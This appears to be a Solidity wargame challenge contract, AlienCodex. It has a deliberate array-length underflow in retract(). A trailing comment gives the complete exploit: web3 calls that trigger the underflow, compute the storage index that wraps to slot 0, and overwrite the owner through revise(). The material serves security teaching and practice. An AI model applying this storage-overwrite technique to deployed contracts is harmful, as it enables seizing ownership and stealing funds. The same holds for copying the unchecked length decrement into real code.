// SPDX-License-Identifier: MIT
pragma solidity ^0.5.0;

//import '../helpers/Ownable-05.sol';
contract Ownable {
    address public owner;

    constructor() public {
        owner = msg.sender;
    }
}

contract AlienCodex is Ownable {

    bool public contact;
    bytes32[] public codex;

    modifier contacted() {
        assert(contact);
        _;
    }

    function make_contact() public {
        contact = true;
    }

    function record(bytes32 _content) contacted public {
        codex.push(_content);
    }

    function retract() contacted public {
        codex.length--;
    }

    function revise(uint i, bytes32 _content) contacted public {
        codex[i] = _content;
    }
}

/*
await web3.eth.getStorageAt(contract.address, 0) // owner, contact

contract.make_contact()

await web3.eth.getStorageAt(contract.address, 1) // codex size
contract.retract() // vulnerable make codex size = 0xfffffffff...
await web3.eth.getStorageAt(contract.address, 1)

codex[i] addr = keccak256(codex_slot) + i = keccak256(1) + i
slot0 addr = 0
i = uint(0) - uint(keccak256(1)) = uint(0) - 0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6 =
  = 0x4ef1d2ad89edf8c4d91132028e8195cdf30bb4b5053d4f8cd260341d4805f30a

await contract.codex("0x4ef1d2ad89edf8c4d91132028e8195cdf30bb4b5053d4f8cd260341d4805f30a") // 0x000 ... 1 ... owner

data = 0x000 ... 1 ... owner
await contract.revise("0x4ef1d2ad89edf8c4d91132028e8195cdf30bb4b5053d4f8cd260341d4805f30a", data)
*/